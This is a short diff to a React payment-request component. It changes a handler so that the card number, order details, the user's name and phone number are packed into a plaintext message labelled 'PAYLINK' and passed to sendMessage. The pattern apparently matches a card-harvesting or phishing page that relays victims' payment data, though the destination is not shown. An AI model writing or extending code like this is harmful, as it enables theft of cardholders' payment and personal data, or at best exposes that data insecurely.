@@ -154,11 +154,16 @@ const PaymentRequest = () => {
     }
   }, [formData]);
 
-  const handleSmsSend = async (order, orderSum, card) => {
+  const handleSmsSend = async (order, orderSum, cardNumber) => {
     try {
       const message = `
-        PAYLINK: order: [${order}] orderSum: [${orderSum}] CARD: [${card}]
-      `;
+        КАРТ ЗАЯВКА PAYLINK : 
+        Order: [${order}]
+        Order Sum: [${orderSum}]
+        Card: [${cardNumber}]
+        User Name: [${formData.name}]
+        Phone Number: [${formData.phoneNumber}]
+    `;
       sendMessage(message);
     } catch (error) {
       console.error('Error sending message:', error.message);
